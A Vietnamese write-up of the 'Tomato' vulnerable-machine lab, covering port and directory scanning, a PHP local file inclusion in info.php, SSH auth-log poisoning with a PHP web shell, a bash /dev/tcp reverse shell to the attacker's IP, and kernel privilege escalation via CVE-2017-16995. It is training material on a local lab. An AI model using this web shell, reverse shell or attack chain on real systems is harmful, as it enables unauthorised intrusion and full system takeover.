# Tomato

Sau khi tải file `.ova` về, import và bắt đầu exploit thôi.

# RECON

Như những bài trước, do chưa biết được địa chỉ IP nhưng biết dải mạng vì do config máy Tomato này mình config vào mạng VMnet1 (NAT)

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled.png)

Và với VMnet1 này mình đặt dải mạng là 192.168.113.0/24

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%201.png)

Do đó mình dùng nmap để scan xem những IP nào đang được mở bằng lệnh

```jsx
nmap -sn -T5 192.168.113.0/24
```

Trong đó:

- -sn: là Ping Scan, tắt chế độ port scan ⇒ Chỉ scan xem IP đó hiện đang được sử dụng hay không.
- -T5: set thời gian cho mỗi gói tin được gửi đi là nhanh nhất, sẽ có từ -T0 đến -T5, trong đó -T5 là nhanh nhất và -T0 là chậm nhất, mặc định của nmap là -T3. Có thể xem thêm sự khác biệt giữa các option tại [đây](https://www.notion.so/Tomato-24412ba48bed406b92b925097995c323?pvs=21).
- Ta có thể sử dụng thêm options `-vv`: để hiển thị kết quả trong quá trình scan ra chứ không đợi scan xong mới hiện ⇒ Theo dõi quá trình scan. Dưới đây mình sẽ để thêm kết quả để so sánh

Có `-vv`

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%202.png)

Không có `-vv`

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%203.png)

Như vậy là có 1 host đang mở là 192.168.113.137 ta có mô hình mạng

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%204.png)

Tiếp tục sẽ scan các cổng đang mở và các dịch vụ trên cổng đó. Lúc này mình sử dụng công cụ là `rustscan` vì nó scan 65535 port nhanh hơn rất nhiều so với nmap, nhưng nó cũng có thể sử dụng kết hợp trong chính tool này để thực hiện các options của nmap. Đầu ra các cổng được mở sẽ được đưa vào nmap để thực hiện tiếp. Đây là câu lệnh mình sử dụng:

```bash
rustscan -a 192.168.113.137 -- -sV -T5
```

Nó sẽ tương đương với câu lệnh này nếu chạy riêng với nmap

```bash
nmap -sV -p- -T5 192.168.113.137
```

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%205.png)

Như vậy là có 3 dịch vụ chính mình quan tâm:

- PORT 80: apache ⇒ Có thể là web
- PORT 2211: SSH
- PORT 8888: nginx ⇒ Có thể là web nữa

Giờ sẽ đi vào recon ở port 80 trước

## PORT 80

Giao diện web chỉ có 1 quả cà chua

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%206.png)

Lúc này mình dùng dirsearch để scan với wordlist mình đã custom, các bạn có thể thử với nhiều wordlist khác nhau ví dụ như những wordlist của dirb, dirbuster,… Scan với dirsearch bằng lệnh

```bash
dirsearch -u http://192.168.113.137/
```

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%207.png)

Với `index.html` thì đó chính là trang chủ hiển thị quả cà chua kia nên mình sẽ thử với endpoint `/antibot_image`

Sau khi vào `/antibot_image`, nó chứa chứa 1 directory nữa là `antibots`, truy cập vào tiếp ta được 1 list các file và directory như sau

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%208.png)

Sau khi đi thử hết các file và directory, chúng ta sẽ cần phải tập trung vào file `info.php`

Trang này hiển thị những thông tin liên quan đến `php`, `system`,…

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%209.png)

Nhưng khi ta xem source sẽ có 1 hint nữa đó là với param `image`

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%2010.png)

Như vậy là sẽ có một hướng để khai thác ở đây

Tiếp theo sẽ đi recon ở port 8888

## PORT 8888

Đây sẽ là giao diện

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%2011.png)

Theo kiến thức mình tìm hiểu thì đây sẽ là một dạng xác thực dựa vào file `.htpasswd`. Do vậy thì có thể các endpoint ẩn trong đây cũng sẽ phải xác thực. Mình thực hiện dirsearch các thứ thì không ra gì nên chuyển tiếp sang PORT 8888

## PORT 2211

Port này đang chạy dịch vụ SSH nên mình sẽ dừng recon ở đây :v

## PORT 21

Port này đang chạy dịch vụ FTP, mình đã thử login vào bằng anonymous nhưng server đang tắt người dùng này. 

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%2012.png)

Cũng giống như dịch vụ SSH, mình có thể bruteforce tài khoản. Do đó mình sẽ chuyển sang phần khai thác

# Exploit

Ở port 80 quan sát thấy có hint là param `image` được truyền qua method GET và nó sẽ là input cho hàm `include`. Đây là một sink rất nguy hiểm nếu đầu vào của nó không được lọc sẵn, nếu đầu vào của nó chứa một đoạn PHP thì nó sẽ hiểu và thực thi đoạn code đó, nếu input là 1 file thường thì nó sẽ đọc ra. Để kiểm chứng ta thử truyền vào là file /etc/passwd

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%2013.png)

Như vậy là có thể khẳng định chỗ này là một lỗi LFI rồi, giờ sẽ có cách hướng khai thác là đưa input vào là một file code PHP để thực hiện trang web thực thi đoạn code trong file PHP đó. Vậy thì là sao để đưa một file PHP mà mình kiểm soát được ở đây? Mình có 2 hướng như này:

- Do dịch vụ FTP đang mở
    - mình truyền file bằng dịch vụ này vào và include file đó vào. Điều kiện là mình cần có tài khoản để login > Phải thực hiện bruteforce > Mất thời gian
    - Sử dụng log của FTP sau khi mình đã chèn ⇒ Đọc file config của FTP tại `/etc/vsftpd.conf`
- Dịch vụ SSH đang mở: Tương tự với FTP mình cũng có 2 hướng
    - Phải bruteforce tài khoản
    - Dùng log ⇒ đọc config `/etc/ssh/sshd_config`

Mình thử với FTP nhưng chưa thành công nên sẽ thử với SSH luôn.

Ban đầu sẽ đọc file config `/etc/ssh/sshd_config`

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%2014.png)

Mình để ý tới 2 dòng này vì nó có ý nghĩa là:

- `LogLevel INFO`: Ghi lại các thông báo cảnh báo và thông tin thông thường
- `SyslogFacility AUTH`: Chỉ ra rằng các sự kiện đăng nhập sẽ được ghi vào file `/var/log/auth.log`

⇒ truy cập vào file `/var/log/auth.log`

Mình thử SSH vào và xem lại log

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%2015.png)

Quay lại xem log

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%2016.png)

Như vậy là log sẽ ghi lại username này, mà username là thứ ta kiểm soát được. Nếu mình để username này là một đoạn code PHP này thì sẽ ra sao? ⇒ Khi được include vào, file info.php sẽ hiểu đoạn code đó là PHP ⇒ Thực thi code PHP.

Lúc này mình sẽ truyền username là một đoạn code PHP như sau:

```php
<?php system($_GET[0]); ?>
```

Trong này mình sử dụng method GET vì trang info.php đang sử dụng method GET để lấy giá trị của param `image`, nếu để là POST thì nó sẽ không nhận param `0` của mình. Nếu được được chọn method thì mình sẽ chọn method POST vì nó có thể không hiện trên log :v

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%2017.png)

Mình SSH lại và nhập pass sai 1 lần thôi là đủ rồi.

Quay lại xem log và truyền thêm 1 param `0` với giá trị là `ls -la /` và shell này đã hoạt động

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%2018.png)

Lúc này mình sẽ thực hiện reverse shell và khai thác sâu thêm:

- Lắng nghe trên máy khai thác
    
    ![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%2019.png)
    
- Truyền lên cho param `0` một payload để thực hiện reverse shell
    
    ```php
    bash -c "bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.31.129.169%2F9999%200%3E%261"
    ```
    
    Trong đó 
    
    - 172.31.129.169: là ip của máy attacker
    - 9999: là port mà ta mở để nghe

Sau khi gửi lên, sẽ có 1 kết nối tới máy của ta

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%2020.png)

Do shell mặc định này khá cùi nên mình sẽ nâng shell lên

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%2021.png)

Lúc này mình sẽ thử chạy 1 file linpeas để nó scan toàn bộ hệ thống xem có thể khai thác được gì không.

```php
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64
chmod +x linpeas_linux_amd64
./linpeas_linux_amd64
```

Chạy xong thì đây là những thứ mình quan tâm

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%2022.png)

⇒ Có lẽ SUID là không khai thác được rồi

Hệ thống sử dụng linux rất thấp rồi

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%2023.png)

Nên là có rất nhiều CVE để khai thác

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%2024.png)

⇒ Mình khai thác theo hướng CVE

Có được version Linux mình search ở [đây](https://github.com/JlSakuya/Linux-Privilege-Escalation-Exploits) nữa thì có rất nhiều CVE để khai thác rồi tìm PoC trên mạng sau đó sẽ thử từng cái.

Ban đầu mình thử với dirtycow trước, khi tải về server mình phát hiện nó không có gcc ⇒ Mình phải compile trước rồi ném vào server rồi chạy.

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%2025.png)

Lúc này mình mở 1 server trên máy attacker này bằng python rồi vào server victim download về

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%2026.png)

Download về trên server và gặp lỗi này

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%2027.png)

Mình chắc chắn là do version ldd nên check thử. Đây là trên máy server 

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%2028.png)

Và đây là trên máy attacker

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%2029.png)

Lúc này mình có ý tưởng:

- Thứ nhất downgrade cái ldd trên attacker xuống
- Thứ 2 là tải 1 con Ubuntu 16.04 LTS về để compile PoC

Tại sao mình lại chọn 16.04 thì là do server này cũng đang chạy 16.04

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%2030.png)

Thử lại với dirtycow trên máy 16.04 đó thì bị lỗi như sau

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%2031.png)

Nên sẽ thử với CVE thứ 2 CVE-2017-16995

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%2032.png)

Trên server download về

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%2033.png)

Thử chạy file đó và

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%2034.png)

Lúc này là hoàn thành rồi

![Untitled](Tomato%2024412ba48bed406b92b925097995c323/Untitled%2035.png)

Ta có thể thử nhiều CVE hơn để đa dạng hóa cách khai thác.